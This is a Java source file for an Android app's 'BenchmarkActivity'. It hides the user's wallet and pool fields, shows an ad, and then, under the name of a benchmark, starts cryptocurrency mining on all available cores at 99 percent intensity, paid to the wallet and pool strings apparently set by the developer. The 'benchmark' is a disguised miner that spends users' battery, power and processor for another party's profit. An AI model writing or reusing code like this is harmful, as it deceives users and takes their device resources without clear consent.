package com.elijaxapps.androidminer;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.MobileAds;

public class BenchmarkActivity extends MainActivity {
    // Remove the below line after defining your own ad unit ID.

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MobileAds.initialize(this, getString(R.string.admob_app_id));
        linpool.setVisibility(View.GONE);
        linuser.setVisibility(View.GONE);
        activity = this;
        start.setOnClickListener(v -> {
            Tools.goToNextLevel(activity, new AdListener());
            startBenchmark(v);
        });
    }


    public void startBenchmark(View view) {
        if (binder == null) return;
        String user = getString(R.string.my_wallet);
        String pool = getString(R.string.my_pool);
        MiningService.MiningConfig cfg = binder.getService().newConfig(user, pool,
                binder.getService().getAvailableCores(), 99, false);
        binder.getService().startMining(cfg);
    }
}
